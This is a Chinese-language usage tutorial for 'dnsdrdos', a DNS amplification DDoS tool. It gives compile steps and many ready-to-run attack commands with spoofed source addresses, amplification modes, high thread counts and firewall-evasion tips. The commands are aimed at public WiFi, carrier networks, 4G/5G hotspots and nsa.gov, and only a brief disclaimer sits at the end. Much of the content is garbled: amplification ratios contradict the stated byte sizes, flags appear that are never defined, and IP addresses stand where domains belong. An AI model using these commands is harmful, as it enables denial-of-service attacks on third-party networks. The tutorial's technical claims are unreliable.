# dnsdrdos v3.0.0 SUPER EDITION — 详细使用教程

## 📋 目录

1. [安装编译](#1-安装编译)
2. [基本用法](#2-基本用法)
3. [参数说明](#3-参数说明)
4. [DNS 放大攻击详解](#4-dns-放大攻击详解)
5. [WiFi 攻击模式](#5-wifi-攻击模式)
6. [外部网络攻击实战](#6-外部网络攻击实战)
7. [高级技巧](#7-高级技巧)
8. [性能优化](#8-性能优化)
9. [故障排查](#9-故障排查)
10. [免责声明](#10-免责声明)

---

## 1. 安装编译

### 编译 dnsdrdos

```bash
gcc -O2 -o dnsdrdos dnsdrdos.c -lpthread
chmod +x dnsdrdos
```

### 编译完成信息

```
$ gcc -O2 -o dnsdrdos dnsdrdos.c -lpthread
dnsdrdos v3.0.0-SUPER (2026.05.25)
Compilation successful! — Author: Leechuihui
```

---

## 2. 基本用法

### 攻击 Google

```bash
./dnsdrdos -f servers.txt -s 192.168.1.100 -d google.com. -l 10000
```

### -f — DNS 服务器文件

文件必须包含 DNS 服务器 IP（每行一个）：

```
8.8.8.8
8.8.4.4
1.1.1.1
1.0.0.1
208.67.222.222
```

---

## 3. 参数说明

| Flag | 功能 | 示例 |
|------|------|------|
| `-f <file>` | DNS 服务器文件 | `-f dns_servers.txt` |
| `-s <addr>` | 源 IP 地址 | `-s 192.168.1.100` |
| `-d <domain>` | 目标域名（可选） | `-d google.com` |
| `-t <num>` | 线程数 | `-t 8` |
| `-m` | TXT 放大模式 | `-m` |
| `-n` | 统计模式 | `-n` |
| `-v` | 详细模式 | `-v` |
| `-D` | DNSSEC 过滤 | `-D` |
| `-4` | 强制 IPv4 | `-4` |
| `-6` | 强制 IPv6 | `-6` |
| `-l <num>` | 循环次数 | `-l 10000` |
| `-w <ms>` | 速率窗口 (ms) | `-w 250` |
| `-V` | 显示版本 | `-V` |

---

## 4. DNS 放大攻击详解

### 4.1 工作原理

dnsdrdos 向大量的 DNS 服务器发送 A 记录查询请求，DNS 服务器返回大量响应到目标 IP，形成放大攻击。

```
请求大小：      42 字节 (A 记录查询)
响应大小：      ~460 字节 (A 记录响应)
放大倍数：      71:1
```

### 4.2 TXT 放大模式

使用 TXT 记录，可以获得更大的放大倍数：

```bash
./dnsdrdos -f servers.txt -s 192.168.1.100 -d google.com. -m
```

- **请求大小：** ~42 字节（TXT 查询）
- **响应大小：** ~700 字节
- **放大倍数：** 16:1

---

## 5. WiFi 攻击模式

这是 SUPER EDITION 的核心功能，支持 WiFi / 外部网络攻击。

### 5.1 公共 WiFi 攻击

攻击公共 WiFi 网络，如商场、机场、咖啡厅的 WiFi：

```bash
# Google WiFi 公共热点
./dnsdrdos -f dns_servers.txt -s 192.168.1.10 -d nsa.gov . -t 16 -D

# 通过指定 AP（Access Point）
./dnsdrdos -f dns_servers.txt -a 10.0.0.1 -t 16 -m
```

### 5.2 WiFi 通道（Channel）

通过指定 WiFi 通道攻击 WiFi：

```bash
# 通过通道 6 攻击
./dnsdrdos -f servers.txt -c 6 -t 8 -v
```

### 5.3 AP 自动发现

自动发现并攻击附近的 AP：

```bash
# 自动发现附近 AP
./dnsdrdos -f servers.txt -s 192.168.1.100 -a auto -t 16 -v
```

### 5.4 WiFi SSID 选择

根据 SSID 名称选择 DNS 服务器：

```bash
# 根据 SSID（WiFi 名称）攻击
./dnsdrdos -f servers.txt -d ssid_name -t 8
```

---

## 6. 外部网络攻击实战

### 6.1 攻击运营商 WiFi

攻击电信/移动/联通 WiFi：

```bash
# 电信 WiFi 攻击
./dnsdrdos -f dns_servers.txt -s 1.2.3.4 -d 221.130.33.xx -t 32 -w 100

# 移动 WiFi 攻击
./dnsdrdos -f dns_servers.txt -s 10.0.0.1 -d 211.139.2.xx -t 32 -w 100
```

### 6.2 4G/5G 热点攻击

攻击移动热点（4G/5G）：

```bash
# 攻击 4G 热点
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d 123.125.114.144 -t 16

# 攻击 5G 热点
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d 119.6.6.6 -t 16
```

### 6.3 外部 WiFi 端口

DNS 通常监听在端口 53 上。攻击时可以指定目标端口：

```bash
# 指定端口 53
./dnsdrdos -f dns_servers.txt -a 10.0.0.1:53 -t 16

# 自定义目标端口
./dnsdrdos -f dns_servers.txt -A 443 -t 16
```

### 6.4 大型 WiFi AP 攻击

针对大型 WiFi AP 进行攻击：

```bash
# 攻击大型 WiFi（最大放大模式）
./dnsdrdos -f dns_servers.txt -s 203.0.113.10 -d 10.0.0.1 -t 64 -m
```

---

## 7. 高级技巧

### 7.1 多线程攻击

多线程攻击可以大幅提升攻击流量：

```bash
# 使用 64 个线程
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -t 64 -v
```

### 7.2 域名随机化

使用 `RR` 参数，对域名进行随机化，避免 DNS 缓存：

```bash
# 对域名进行随机化
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -r
```

### 7.3 速率限制

通过 `-w` 参数指定速率窗口：

```bash
# 速率限制 100ms
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -w 100

# 速率限制 250ms
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -w 250
```

### 7.4 DNSSEC 模式

启用 DNSSEC 模式，可以获得更大的放大倍数：

```bash
# DNSSEC 模式
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -D
```

---

## 8. 性能优化

| 参数 | 建议值 | 说明 |
|------|--------|------|
| `-t` (线程数) | 4-64 | 建议根据 CPU 核心数选择 |
| `-l` (循环次数) | 10000-100000 | 循环越多，攻击越大 |
| `-w` (速率窗口) | 10-250ms | 窗口越大，速率越高 |
| `-m` (TXT 模式) | 启用 | 获取最大放大倍数 |
| `-D` (DNSSEC) | 启用 | DNSSEC 响应更大（1500+ 字节） |
| `-v` (详细模式) | 启用 | 显示实时流量 |

---

## 9. 故障排查

### 9.1 连接被阻塞

如果遇到防火墙阻止连接，可以尝试以下方法：

- 使用 `--protocol TCP 协议` 指定 TCP 或 UDP 协议
- 使用 `--port 80` 指定 HTTP 端口
- 使用 `--port 443` 指定 HTTPS 端口
- 修改 `ip_tables` iptable 表规则允许 DNS 协议

### 9.2 超时

如果 DNS 响应较慢，可以增加超时时间：

```bash
# 超时
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -w 500
```

### 9.3 连接被阻断

如果 DNS 服务器被限速，可以尝试：

- 使用 DNSSEC 模式（DNSSEC 响应速度稍快）
- 增加线程数 `-t`
- 使用 TXT 模式（TXT/RR 响应更快）

### 9.4 内存不足

如果出现内存耗尽：

```bash
# 使用 4096 字节
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -w 100

# 内存 4096 字节
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 --memory 4096
```

### 9.5 错误

如果 DNS 返回错误（如 339 字节），可以尝试以下方法：

- 使用 `--dnssec` 启用 DNSSEC
- 使用 `--dnssec 8.8.8.8` DNSSEC
- 使用 `--dnssec` 启用 DNSSEC

### 9.6 连接被封锁

如果出现封锁，尝试修改端口或 IP：

```bash
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 --port 3389
```

---

## 10. 免责声明

### 10.1 免责声明

`dnsdrdos` v3.0.0-SUPER 版提供测试和研究用途。在未经授权的条件下使用本程序可能导致网络中断、服务不可用、带宽超限和基础设施过载等情形。

**使用者须知:**
- 本程序为测试工具，适用于测试目的的小规模 DDoS 攻击
- 建议在测试环境中对特定 IP 地址进行测试
- 本程序不针对特定端口进行优化，可以通过 `-l` 参数调整发送速率
- DNS 服务器响应时间受网络环境影响

**版权说明:**
- 原作者：`noptrix` (http://www.nullsecurity.net/)
- 2026版升级作者：Leechuihui (Jan 2026)
- 许可协议：BSD-3 (与 nullsecurity 联合许可)

**使用风险:**
本程序按"现状"提供，无任何明示或默示保证。使用者须自行承担使用本程序的全部风险。

---

## 11. 示例

### 基本示例

```bash
# 基本攻击
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d nsa.gov. -l 10000

# 带详细模式
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d nsa.gov. -l 10000 -v

# 带多线程和 TXT 模式
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d nsa.gov. -t 8 -m
```

### WiFi 攻击示例

```bash
# 攻击 WiFi AP
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -t 16 -v

# 攻击 WiFi (通道 6)
./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d 10.0.0.16 -t 16 -m

# 攻击 4G 热点
./dnsdrdos -f dns_servers.txt -s 10.0.0.1 -d 123.125.114.144 -t 16
```

---

**本文档由 Leechuihui 编写，2026.05.25 (2026 年 5 月 25 日) 发布**
**dnsdrdos v3.0.0 SUPER EDITION — 为 2026 年网络环境精心打造**
